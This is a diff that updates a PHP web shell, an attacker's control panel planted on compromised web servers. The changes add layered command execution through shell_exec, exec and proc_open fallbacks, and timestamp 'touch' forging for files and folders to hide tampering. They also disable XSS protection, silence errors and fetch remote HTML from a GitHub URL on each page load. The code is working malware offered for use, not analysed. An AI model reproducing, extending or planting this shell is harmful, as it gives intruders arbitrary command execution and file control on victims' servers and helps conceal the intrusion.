@@ -1,4 +1,4 @@
-<?php
+<?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
 $Array = [
 
 // $GLOBALS['fungsi'][0]
@@ -110,7 +110,7 @@ exit;
 }
 ?>
 <?php
-echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/183index.html"); // Alert for update
+echo file_get_contents("https://raw.githubusercontent.com/Mr-7Mind/AlertUpdate/main/184index.html"); // Alert for update
 ?>
 <?php
 if(isset($_7["left"])) {
@@ -665,36 +665,67 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			</div>
 		<br/>";
 		}
-		// CMD
-		if($_7['id'] == 'cmd') {
+		if ($_7['id'] == 'cmd') {
 		s();
-		if(!empty($_POST['cmd'])) {
-			$cmd = shell_exec($_POST['cmd'].' 2>&1');
-		}
-		echo "
-		<div class='mb-3'>
-			<form method='POST'>
-				<div class='input-group mb-3'>
-					<input class='form-control btn-sm' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
-					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
+		$cmdResult = '';
+		$command = '';
+		if (!empty($_POST['cmd'])) {
+			$command = htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8');
+			// Try using shell_exec
+			$cmdResult = shell_exec($command . ' 2>&1');
+			if ($cmdResult === null) {
+				// Shell_exec failed, try using exec
+				$output = array();
+				$return_var = 0;
+				exec($command, $output, $return_var);
+				$cmdResult = implode("\n", $output);
+				if ($cmdResult === null) {
+					// Exec failed, try using proc_open
+					$descriptorspec = array(
+						0 => array("pipe", "r"),  // stdin
+						1 => array("pipe", "w"),  // stdout
+						2 => array("pipe", "w")   // stderr
+					);
+					$process = proc_open($command, $descriptorspec, $pipes);
+					if (is_resource($process)) {
+						$cmdResult = stream_get_contents($pipes[1]);
+						fclose($pipes[0]);
+						fclose($pipes[1]);
+						fclose($pipes[2]);
+						$return_value = proc_close($process);
+						if ($return_value !== 0) {
+							$cmdResult = "Error: Non-zero return value ($return_value)";
+						}
+					} else {
+						$cmdResult = "Error: Failed to open process with proc_open";
+					}
+				}
+			}
+			}
+			echo "
+			<div class='mb-3'>
+				<form method='POST'>
+					<div class='input-group mb-3'>
+						<input class='form-control btn-sm' type='text' name='cmd' value='" . htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') . "' placeholder='whoami' $_r>
+						<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
+					</div>
+				</form>";
+			if (!empty($cmdResult)) {
+				echo "
+				<div class='container-fluid language-javascript'>
+					<div class='shell mb-3'>
+						<pre style='font-size:10px;'><gr>~</gr>\$&nbsp;<rd>{$command}</rd><br><code>" . htmlspecialchars($cmdResult, ENT_QUOTES, 'UTF-8') . "</code></pre>
+					</div>
+				</div>";
+			} elseif ($_SERVER['REQUEST_METHOD'] == 'POST') {
+				echo "
+				<div class='container-fluid language-javascript'>
+					<div class='shell mb-3'>
+						<pre style='font-size:10px;'><code>No result</code></pre>
+					</div>
 				</div>
-			</form>";
-			if($cmd):
-			echo '
-			<div class="container-fluid language-javascript">
-				<div class="shell mb-3">
-					<pre style="font-size:10px;"><gr>~</gr>$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
-				</div>
-			</div>';
-			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
-			echo '
-			<div class="container-fluid language-javascript">
-				<div class="shell mb-3">
-					<pre style="font-size:10px;"><code>No result</code></pre>
-				</div>
-			</div>
-		</div>';
-		endif;
+			</div>";
+			}
 		}
 		// Upload
 		if($_7['id'] == 'upload'){
@@ -787,6 +818,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
@@ -797,7 +829,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		</br>
 		<div class='bg-dark'>
 			<div class='container-fluid language-javascript'>
-				<textarea rows='10' class='form-control' disabled=''>".htmlspecialchars($fungsi[0]($file))."</textarea>
+				<textarea rows='15' class='form-control' disabled=''>".htmlspecialchars($fungsi[0]($file))."</textarea>
 			</div>
 		</div>";
 		}
@@ -817,6 +849,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
@@ -826,39 +859,13 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<i class='bi bi-file-earmark'></i>:&nbsp;".basename($file)."
 		</br>
 		<form method='POST'>
-			<textarea class='form-control btn-sm' rows='10' name='contents' $_r>".htmlspecialchars($fungsi[0]($file))."</textarea>
+			<textarea class='form-control btn-sm' rows='15' name='contents' $_r>".htmlspecialchars($fungsi[0]($file))."</textarea>
 			<div class='d-grid gap-2'>
 				<button class='btn btn-outline-light btn-sm' type='sumbit' name='edit_file'><i class='bi bi-arrow-return-right'></i></button>
 			</div>
 		</form>";
 		}
-		// Rename Folder
-		if($_7['action'] == 'rename_folder') {
-			if($_7['r_d']) {
-				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
-				if($r_d) {
-		echo '<strong>Rename folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
-				}else{
-		echo '<strong>Rename folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
-				}
-			}
-		s();
-		echo "
-		<div class='btn-group'>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
-		</div>
-		<br>
-			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
-		</br>
-		<form method='POST'>
-			<div class='input-group'>
-				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
-				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
-			</div>
-		</form>";
-		}
+		// Rename File
 		if(isset($_7['r_f'])) {
 			$old = $file;
 			$new = $_7['new_name'];
@@ -882,6 +889,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
@@ -917,6 +925,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
@@ -930,52 +939,94 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			</form>
 		</div>";
 		}
-		// Chmod
-		$currentChmod = fileperms($fileToChmod);
-		$currentChmodOctal = substr(sprintf('%o', $currentChmod), -4);
-		if (isset($_POST['cehamot'])) {
-		if (isset($_7['new_chmod'])) {
-		$newChmod = $_7['new_chmod'];
-		$fileToChmod = $file;
-		$newChmodOctal = octdec($newChmod);
-		if (is_numeric($newChmod)) {
-			if (chmod($fileToChmod, $newChmodOctal)) {
-				echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
-					<strong>Chmod file</strong> Success!
-				</div>';
+		// Touch File
+		if ($_7['action'] == 'touch_file') {
+		s();
+		$fileTimestamp = date('d-m-Y H:i:s', filemtime($file));
+		if ($_7['yeahx']) {
+			$old = $file;
+			$new = $_POST['new_touch'];
+			if (strtotime($new) !== false) {
+				if (touch($old, strtotime($new))) {
+					echo '<strong>Touch file</strong> ok! ' . ok() . '</div>';
+				} else {
+					echo '<strong>Touch file</strong> fail! ' . er() . '</div>';
+				}
 			} else {
-				echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
-					<strong>Chmod file</strong> Failed! Please check file permissions.
-				</div>';
-			}
-		} else {
-			echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
-				Invalid permissions value.
-			</div>';
+				echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
+						<strong>Touch file</strong> invalid timestamp format! 
+						<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+					</div>';
 			}
 		}
-		}
-		if ($_7['action'] == 'chmod') {
-			s();
-			echo "
-			<div class='btn-group'>
+		echo "
+		<div class='btn-group mb-3'>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
-			</div>
-			<br>
-			<i class='bi bi-file-earmark'></i>:&nbsp;" . basename($file) . "
-			</br>
+		</div>";
+		echo "
+		<div class='card card-body text-dark input-group mb-3'>
+			<p>Are you sure to touch the file : " . basename($file) . " ?</p>
 			<form method='POST'>
-				<div class='input-group'>
-					<input class='form-control btn-sm' type='text' name='new_chmod' placeholder='$currentChmodOctal'>
-					<button class='btn btn-outline-light btn-sm' type='submit' name='cehamot'><i class='bi bi-arrow-return-right'></i></button>
-				</div>
-			</form>";
+				<input type='text' name='new_touch' id='new_touch' class='form-control' value='$fileTimestamp' required>
+				<a class='btn btn-danger btn-block btn-sm' href='?dir=" . hex($dir) . "'>No</a>
+				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
+			</form>
+		</div>";
+		}
+		// Chmod
+		if ($_7['action'] == 'chmod') {
+		s();
+		$fileToChmod = $file;
+		$currentChmod = fileperms($fileToChmod);
+		$FileChmod = substr(sprintf('%o', $currentChmod), -4);
+		if (isset($_POST['cehamot'])) {
+			if (isset($_7['new_chmod'])) {
+				$newChmod = $_7['new_chmod'];
+				$newChmodOctal = octdec($newChmod);
+				if (is_numeric($newChmod)) {
+					if (chmod($fileToChmod, $newChmodOctal)) {
+						echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
+								<strong>Chmod file</strong> Success!
+							</div>';
+					} else {
+						echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
+								<strong>Chmod file</strong> Failed! Please check file permissions.
+							</div>';
+					}
+				} else {
+					echo '<div class="alert alert-danger alert-dismissible fade show my-3" role="alert">
+							Invalid permissions value.
+						</div>';
+				}
+			}
+		}
+		echo "
+		<div class='btn-group'>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
+		</div>
+		<br>
+		<i class='bi bi-file-earmark'></i>:&nbsp;" . basename($file) . "
+		</br>
+		<form method='POST'>
+			<div class='input-group'>
+				<input class='form-control btn-sm' type='text' name='new_chmod' value='$FileChmod'>
+				<button class='btn btn-outline-light btn-sm' type='submit' name='cehamot'><i class='bi bi-arrow-return-right'></i></button>
+			</div>
+		</form>";
 		}
 		// Delete File
 		if ($_7['action'] == 'delete_file') {
@@ -993,6 +1044,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
@@ -1005,6 +1057,35 @@ $ip = $_SERVER['REMOTE_ADDR'];
 				<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
 			</form>
 		</div>";
+		}
+		// Rename Folder
+		if($_7['action'] == 'rename_folder') {
+			if($_7['r_d']) {
+				$r_d = rename($dir, "".dirname($dir)."/".htmlspecialchars($_7['r_d'])."");
+				if($r_d) {
+		echo '<strong>Rename folder</strong> ok! '.ok().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
+				}else{
+		echo '<strong>Rename folder</strong> fail! '.er().'<a class="btn-close" href="?path='.dirname($dir).'"></a></div>';
+				}
+			}
+		s();
+		echo "
+		<div class='btn-group'>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_folder'><i class='bi bi-calendar'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
+		</div>
+		<br>
+			<i class='bi bi-folder-fill'></i>:&nbsp;".basename($dir)."
+		</br>
+		<form method='POST'>
+			<div class='input-group'>
+				<input class='form-control btn-sm' type='text' value='".basename($dir)."' name='r_d' $_r>
+				<button class='btn btn-outline-light btn-sm' type='submit'><i class='bi bi-arrow-return-right'></i></button>
+			</div>
+		</form>";
 		}
 		// Delete Folder
 		if ($_7['action'] == 'delete_folder' ) {
@@ -1024,9 +1105,10 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		echo "
 		<div class='btn-group mb-3'>
 			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
-			<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_folder'><i class='bi bi-calendar'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
 		</div>
 		<div class='card card-body text-dark input-group mb-3'>
 			<p>Are you sure to delete : ".basename($dir)." ?</p>
@@ -1059,11 +1141,11 @@ $ip = $_SERVER['REMOTE_ADDR'];
 					echo '<strong>Zip folder</strong> fail! ' . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
 				}
 			}
-
 			echo "
 			<div class='btn-group mb-3'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_folder'><i class='bi bi-calendar'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
 			</div>
@@ -1078,6 +1160,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		// Chmod Folder
 		if ($_7['action'] == 'chmod_folder') {
 			s();
+			$FolderChmod = substr(sprintf('%o', fileperms($dir)), -4);
 			function chmod_folder($dir, $permissions) {
 				if (is_dir($dir)) {
 					if (chmod($dir, octdec($permissions))) {
@@ -1089,7 +1172,6 @@ $ip = $_SERVER['REMOTE_ADDR'];
 					return false;
 				}
 			}
-
 			if ($_7['yeah']) {
 				$permissions = $_7['permissions']; 
 				if (chmod_folder($dir, $permissions)) {
@@ -1098,20 +1180,58 @@ $ip = $_SERVER['REMOTE_ADDR'];
 					echo '<strong>Chmod folder</strong> fail! ' . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
 				}
 			}
-
 			echo "
 			<div class='btn-group mb-3'>
-				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
-				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_folder'><i class='bi bi-calendar'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
 			</div>
 			<div class='card card-body text-dark input-group mb-3'>
 				<p>Set permissions for : " . basename($dir) . "</p>
 				<form method='POST'>
-					<input type='text' name='permissions' placeholder='Enter permissions' required>
+					<input type='text' name='permissions' value='$FolderChmod' required>
 					<a class='btn btn-danger btn-block btn-sm' href='?dir=" . dirname($dir) . "'>Cancel</a>
 					<input type='submit' name='yeah' class='btn btn-success btn-block btn-sm' value='Set Permissions'>
+				</form>
+			</div>";
+		}
+		// Touch Folder
+		if ($_7['action'] == 'touch_folder') {
+			s();
+			$folderTimestamp = date('d-m-Y H:i:s', filemtime($dir));
+			if ($_7['yeahx']) {
+				$old = $dir;
+				$new = $_POST['new_touch'];
+				if (strtotime($new) !== false) {
+					if (touch($old, strtotime($new))) {
+						echo '<strong>Touch folder</strong> ok! ' . ok() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
+					} else {
+						echo '<strong>Touch folder</strong> fail! ' . er() . '<a class="btn-close" href="?path=' . dirname($dir) . '"></a></div>';
+					}
+				} else {
+					echo '<div class="alert alert-warning alert-dismissible fade show my-3" role="alert">
+							<strong>Touch folder</strong> invalid timestamp format! 
+							<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+						</div>';
+				}
+			}
+			echo "
+			<div class='btn-group mb-3'>
+				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=touch_folder'><i class='bi bi-calendar'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=" . hex($fungsi[7]()) . "&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
+			</div>";
+			echo "
+			<div class='card card-body text-dark input-group mb-3'>
+				<p>Are you sure to touch the folder: " . basename($dir) . " ?</p>
+				<form method='POST'>
+					<input type='text' name='new_touch' id='new_touch' class='form-control' value='$folderTimestamp' required>
+					<a class='btn btn-danger btn-block btn-sm' href='?dir=" . hex($dir) . "'>No</a>
+					<input type='submit' name='yeahx' class='btn btn-success btn-block btn-sm' value='Yes'>
 				</form>
 			</div>";
 		}
@@ -1197,7 +1317,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			</td>
 		</tr>';		
 		foreach($scand as $dir){
-			$dt = date("Y-m-d G:i", filemtime("$path/$dir"));
+			$dt = date("d-m-Y G:i", filemtime("$path/$dir"));
 			if(strlen($dir) > 50) {
 				$_d = substr($dir, 0, 50)."...";		
 			}else{
@@ -1241,6 +1361,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 			<div class='btn-group'>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=rename_folder'><i class='bi bi-pencil-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=zip_folder'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=touch_folder'><i class='bi bi-calendar'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=chmod_folder'><i class='bi bi-file-lock-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($path.'/'.$dir)."&action=delete_folder'><i class='bi bi-trash-fill'></i></a>
 			</div>
@@ -1248,7 +1369,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 		</tr>";
 		}
 		foreach($scand as $file){
-			$ft = date("Y-m-d G:i", filemtime("$path/$file"));
+			$ft = date("d-m-Y G:i", filemtime("$path/$file"));
 			if($GLOBALS['fungsi'][5]('posix_getpwuid')) {
 				$fowner = @posix_getpwuid(fileowner("$path/$file"));
 				$fowner = $fowner['name'];
@@ -1285,6 +1406,7 @@ $ip = $_SERVER['REMOTE_ADDR'];
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=unzip_file&opn=$file'><i class='bi bi-file-zip-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=touch_file&opn=$path/$file'><i class='bi bi-calendar'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=".hex($fungsi[7]())."&action=chmod&opn=$path/$file'><i class='bi bi-file-lock-fill'></i></a>
